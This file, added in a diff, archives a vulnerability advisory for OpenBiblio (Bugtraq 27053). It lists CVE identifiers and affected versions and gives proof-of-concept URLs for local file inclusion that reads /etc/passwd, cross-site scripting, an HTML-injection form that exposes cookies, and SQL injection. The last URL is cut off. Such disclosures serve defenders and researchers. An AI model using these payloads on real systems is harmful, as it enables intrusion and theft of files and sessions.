@@ -1,0 +1,118 @@
+#SpeeDr00t@Black Falcon<br>#bid27053<p><b><span style="font-size: 18pt;">OpenBiblio Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/27053/info">info</a><br><a href="http://www.securityfocus.com/bid/27053/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/27053/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/27053/solution">solution</a><br><a href="http://www.securityfocus.com/bid/27053/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				27053
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-6606<br/>
+				
+					CVE-2007-6607<br/>
+				
+					CVE-2006-5149<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 28 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 05 2016 10:00PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Juan Galiana is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBiblio OpenBiblio 0.5.1 <br/>
+					
+				
+					OpenBiblio OpenBiblio 0.3 <br/>
+					
+				
+					OpenBiblio OpenBiblio 0.2.1 <br/>
+					
+				
+					OpenBiblio OpenBiblio 0.2 <br/>
+					
+				
+					OpenBiblio OpenBiblio  0.5.2-pre4<br/>
+					
+				
+					OpenBiblio OpenBiblio  0.5.2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBiblio OpenBiblio  0.6.0<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit some of these issues, the attacker must entice an unsuspecting victim to follow a malicious URI.<br/><br/>The following proofs of concept are available:<br/><br/>Local file-include vulnerabilities: <br/><br/>http://www.example.com/openbiblio/shared/help.php?page=../../../../../../etc/passwd%00 <br/>http://www.example.com/openbiblio/shared/header.php?tab=../../../etc/passwd%00<br/><br/>Cross-site scripting vulnerabilities:<br/><br/>http://www.example.com/openbiblio/admin/staff_del_confirm.php?UID=1&amp;amp;LAST=XSS&amp;amp;FIRST=XSS<br/>http://www.example.com/openbiblio/admin/theme_del_confirm.php?themeid=6&amp;amp;name=XSS<br/><br/>HTML-injection vulnerability:<br/><br/>&amp;lt;form action="http://www.example.com/openbiblio/admin/theme_preview.php" method="post"&amp;gt;<br/>&amp;lt;input type="text" name="themeName" size="40" value="&amp;lt;script&amp;gt;alert(<br/>document.cookie);&amp;lt;/script&amp;gt;"&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;<br/>&amp;lt;input type="submit" value="doit"&amp;gt;<br/>&amp;lt;/form&amp;gt;<br/><br/>SQL-injection vulnerability:<br/><br/>http://www.example.com/openbiblio/reports/report_criteria.php?reset=Y&amp;amp;rptid=balanceDueList&amp;amp;title=Balance+Due+Member+List&amp;amp;sql=%0A++++SQL%0A++
+	
+		<ul>
+</ul>
+</div>
